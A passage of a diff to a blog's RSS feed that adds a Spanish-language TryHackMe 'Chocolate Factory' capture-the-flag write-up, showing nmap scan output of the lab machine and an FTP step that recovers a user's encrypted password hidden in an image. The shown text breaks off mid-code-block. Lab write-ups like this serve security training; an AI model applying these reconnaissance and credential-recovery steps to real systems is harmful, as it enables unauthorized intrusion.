@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Tue, 12 Jan 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 19 Jan 2021 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,718 @@
     
     
 
+      
+      <item>
+        <title>TryHackMe - Chocolate Factory</title>
+        <link>https://sckull.github.io/posts/chocolatfactory/</link>
+        <pubDate>Tue, 19 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 19 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/chocolatfactory/</guid>
+        <description>Chocolate Factory es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
+        <content:encoded>&lt;p&gt;Chocolate Factory es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Chocolate Factory&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Room&lt;/td&gt;
+&lt;td&gt;Chocolate Factory&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;A Charlie And The Chocolate Factory themed room, revisit Willy Wonka&amp;rsquo;s chocolate factory!&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;120&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Makers&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/0x9747&#34;&gt;0x9747&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://tryhackme.com/p/saharshtapi&#34;&gt;saharshtapi&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://tryhackme.com/p/AndyInfoSec&#34;&gt;AndyInfoSec&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos con nmap nos muestra varios puertos abiertos, pero nos interesan por el momento a los que podemos acceder: ftp (21), ssh (22) y http (http).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan 19 20:53:24 2021 as: nmap -p- --min-rate 1000 -o scanPorts chocolat.thm&lt;/span&gt;
+Warning: 10.10.0.127 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; chocolat.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.0.127&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;64450&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1056&lt;/span&gt; filtered ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+100/tcp open  newacct
+101/tcp open  hostname
+102/tcp open  iso-tsap
+103/tcp open  gppitnp
+104/tcp open  acr-nema
+105/tcp open  csnet-ns
+106/tcp open  pop3pw
+107/tcp open  rtelnet
+108/tcp open  snagas
+109/tcp open  pop2
+110/tcp open  pop3
+111/tcp open  rpcbind
+112/tcp open  mcidas
+113/tcp open  ident
+114/tcp open  audionews
+115/tcp open  sftp
+116/tcp open  ansanotify
+117/tcp open  uucp-path
+118/tcp open  sqlserv
+119/tcp open  nntp
+120/tcp open  cfdptkt
+121/tcp open  erpc
+122/tcp open  smakynet
+123/tcp open  ntp
+124/tcp open  ansatrader
+125/tcp open  locus-map
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jan 19 20:55:58 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan 19 21:02:09 2021 as: nmap -sV -sC -o servPorts chocolat.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; chocolat.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.0.127&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;989&lt;/span&gt; closed ports
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 3.0.3
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_auth-owners: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_-rw-rw-r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;208838&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 14:31 gum_room.jpg
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   STAT: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FTP server status:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Connected to ::ffff:10.2.29.162
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Logged in as ftp
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      TYPE: ASCII
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      No session bandwidth limit
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Control connection is plain text
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Data connections will be plain text
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      At session startup, client count was &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      vsFTPd 3.0.3 - secure, fast, stable
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_End of status
+22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_auth-owners: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp  open  http       Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;100/tcp open  newacct?
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_auth-owners: ERROR: Script execution failed (use -d to debug)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;| fingerprint-strings: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|   HTTPOptions, RTSPRequest: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     &amp;#34;Welcome to chocolate room!! 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     ___.---------------.
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     .&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__,&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; . ____ ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     _:&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;:. &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;_&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;. &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20__&lt;span class=&#34;s1&#34;&gt;&amp;#39;_;-----------------`
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     \|______________________;________________|
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_    hope you wont drown Augustus&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[... REDACTED ...]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;125/tcp open  locus-map?
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_auth-owners: ERROR: Script execution failed (use -d to debug)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;| fingerprint-strings: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|   GenericLines, NULL: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     &amp;#34;Welcome to chocolate room!! 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     ___.---------------.
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|     .&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__,&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; . ____ ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     _:&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;:. &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;_&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;. &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; ___ &lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;__&lt;span class=&#34;s1&#34;&gt;&amp;#39;__&amp;#39;&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20__&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;-----------------&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\|&lt;/span&gt;______________________&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;________________&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     small hint from Mr.Wonka : Look somewhere &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;, its not here! &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    hope you wont drown Augustus&lt;span class=&#34;s2&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60078F67%P=x86_64-pc-linux-gnu%r(HTT
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:POptions,20F,&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;Welcome&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20to&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20chocolate&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20room!!&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20&lt;span class=&#34;se&#34;&gt;\r\n\x&lt;/span&gt;20&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+SF:!&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\)\x&lt;/span&gt;20&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;I&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20hope&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20you&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20wont&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20drown&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20Augustus&lt;span class=&#34;se&#34;&gt;\&amp;#34;\x&lt;/span&gt;20&lt;span class=&#34;s2&#34;&gt;&amp;#34;);
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Tue Jan 19 21:08:06 2021 -- 1 IP address (1 host up) scanned in 356.86 seconds
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;En el servicio FTP encontramos una imagen la cual contenia un archivo embebido que tenia un archivo codificado en base64, al decodificarlo encontramos la contraseña encriptada del usuario &lt;code&gt;charlie&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
